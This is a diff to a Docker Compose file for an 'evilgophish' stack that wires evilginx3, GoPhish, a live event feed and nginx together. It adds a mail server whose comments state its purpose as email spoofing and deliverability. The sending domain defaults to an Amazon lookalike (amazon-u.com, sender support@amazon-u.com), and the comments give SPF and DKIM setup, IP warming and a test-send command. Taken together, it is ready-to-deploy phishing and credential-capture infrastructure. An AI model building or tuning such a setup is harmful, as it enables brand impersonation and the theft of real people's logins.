@@ -1,25 +1,18 @@
 # docker-compose.yml
-# Enhanced Docker Compose for evilgophish: Integrates evilginx3, GoPhish, evilfeed with nginx proxy.
-# Services: nginx (proxy), gophish (campaigns/stats), evilginx (phishing proxy), evilfeed (real-time).
-# Volumes: Persistent for data, configs, uploads (templates, phishlets, CSVs, logs).
-# Recommended Volumes:
-# - gophish_data: DB (gophish.db), templates, groups CSVs – persist campaigns.
-# - evilginx_data: Phishlets (YAML), templates (turnstile/forbidden.html), config – custom phishlets.
-# - evilfeed_data: Event logs – for auditing/feed persistence.
-# - uploads: Host-mounted for easy file uploads (CSVs, HTML templates) – bind mount.
-# - ssl: For certs – mount LetsEncrypt or self-signed.
-# - logs: Shared logs for all services – debugging.
-# Env: Via .env – secrets for APIs (Twilio, Turnstile, SMTP).
-# Ports: 80/443 external (phishing), local-only for admin/feed.
+# Enhanced Docker Compose for evilgophish with integrated mailserver for SMTP.
+# New Service: mailserver (docker-mailserver) for long-term email sending/relay.
+# Why: Custom SMTP for spoofing/deliverability; integrates with GoPhish for campaigns.
+# How: GoPhish uses mailserver:587 with auth; Evilginx indirect (via GoPhish emails).
+# Volumes: Added maildata (mails/DB), mailstate (queue/state), maillogs, config (custom cfgs).
+# Ports: SMTP 25/465/587 exposed; IMAP/POP optional (commented).
 # Best Practices:
-# - Security: Use docker secrets for env vars (docker secret create twilio_sid <file>).
-# - Volumes: Backup with docker volume ls/inspect; rsync host mounts.
-# - Networking: Isolated bridge net; add firewall (ufw/docker iptables).
-# - Healthchecks: Add healthcheck to services (e.g., curl admin ports).
-# - Logging: Driver json-file; rotate with max-size: 10m.
-# - Scaling: evilginx can handle multiple phishlets; no need for replicas.
-# - Updates: docker-compose pull; rebuild for code changes.
-# - Tips: Mount /dev/shm for temp if needed; use --cap-add=NET_ADMIN for evilginx iptables.
+# - DNS: Point MX to host IP; add SPF TXT "v=spf1 ip4:YOUR_IP include:_spf.yourdomain ~all".
+# - DKIM: Post-setup, run docker exec mailserver setup dkim; add TXT to DNS.
+# - Security: Use strong pass; firewall ports (ufw allow 25,465,587 from trusted).
+# - Deliverability: Warm IP; monitor logs for bounces/spam.
+# - Integration: Set GoPhish SMTP to mailserver:587, user support@amazon-u.com.
+# - Long-term: Persistent volumes; backup maildata; rotate DKIM yearly.
+# Tips: Test sending with docker exec mailserver swaks --to test@gmail.com --from support@amazon-u.com --server localhost:587 -au support@amazon-u.com -ap PASS.
 
 version: '3.8'
 
@@ -58,9 +51,9 @@ services:
       - logs:/app/logs
     environment:
       - GOPHISH_DB_PATH=/app/data/gophish.db
-      - SMTP_HOST=${SMTP_HOST:-smtp.gmail.com}
+      - SMTP_HOST=${SMTP_HOST:-mailserver}  # Now defaults to internal mailserver
       - SMTP_PORT=${SMTP_PORT:-587}
-      - SMTP_USER=${SMTP_USER}
+      - SMTP_USER=${SMTP_USER:-support@amazon-u.com}
       - SMTP_PASS=${SMTP_PASS}
       - TWILIO_ACCOUNT_SID=${TWILIO_ACCOUNT_SID}
       - TWILIO_AUTH_TOKEN=${TWILIO_AUTH_TOKEN}
@@ -68,6 +61,7 @@ services:
     command: ./gophish --admin ./config.json
     depends_on:
       - evilfeed
+      - mailserver  # Depend on mail for SMTP
     restart: unless-stopped
     networks:
       - evilnet
@@ -84,7 +78,7 @@ services:
     volumes:
       - evilginx_data:/app
       - /etc/resolv.conf:/etc/resolv.conf:ro
-      - uploads:/app/uploads:ro  # Read phishlets/templates from host
+      - uploads:/app/uploads:ro
       - logs:/app/logs
     environment:
       - DOMAIN=${DOMAIN:-amazon-u.com}
@@ -93,7 +87,7 @@ services:
       - RID_REPLACEMENT=${RID_REPLACEMENT:-user_id}
       - TURNSTILE_PUBLIC=${TURNSTILE_PUBLIC}
       - TURNSTILE_PRIVATE=${TURNSTILE_PRIVATE}
-      - GOPHISH_DB=/app/data/gophish.db  # Access via shared volume? Use network or bind
+      - GOPHISH_DB=/app/data/gophish.db
       - FEED_ENABLED=${FEED_ENABLED:-true}
     command: >
       sh -c "
@@ -138,6 +132,42 @@ services:
       timeout: 10s
       retries: 3
 
+  mailserver:
+    image: ghcr.io/docker-mailserver/docker-mailserver:latest
+    hostname: mail.${DOMAIN:-amazon-u.com}
+    ports:
+      - "25:25"
+      - "465:465"
+      - "587:587"
+      # - "143:143"  # IMAP if needed
+      # - "993:993"  # IMAPS
+    volumes:
+      - maildata:/var/mail
+      - mailstate:/var/mail-state
+      - maillogs:/var/log/mail
+      - ./mailconfig:/tmp/docker-mailserver/
+      - logs:/var/log/supervisor  # Shared logs
+    environment:
+      - OVERRIDE_HOSTNAME=mail.${DOMAIN:-amazon-u.com}
+      - DMS_DMARC_POLICY=quarantine  # Or reject/none
+      - DMS_SPF_POLICY=reject
+      - PERMIT_DOCKER=network  # Allow from evilnet
+      - ENABLE_CLAMAV=1  # Antivirus
+      - ENABLE_FAIL2BAN=1  # Security
+      - ENABLE_POSTGREY=0  # Optional greylisting
+      - SSL_TYPE=snakeoil  # Self-signed; use letsencrypt for prod
+    cap_add:
+      - NET_ADMIN
+      - SYS_PTRACE
+    restart: unless-stopped
+    networks:
+      - evilnet
+    healthcheck:
+      test: ["CMD", "nc", "-z", "localhost", "25"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
 volumes:
   gophish_data:
   evilginx_data:
@@ -145,6 +175,10 @@ volumes:
   uploads:
   ssl:
   logs:
+  maildata:
+  mailstate:
+  maillogs:
+  mailconfig:  # For overrides like postfix.cf
 
 networks:
   evilnet:
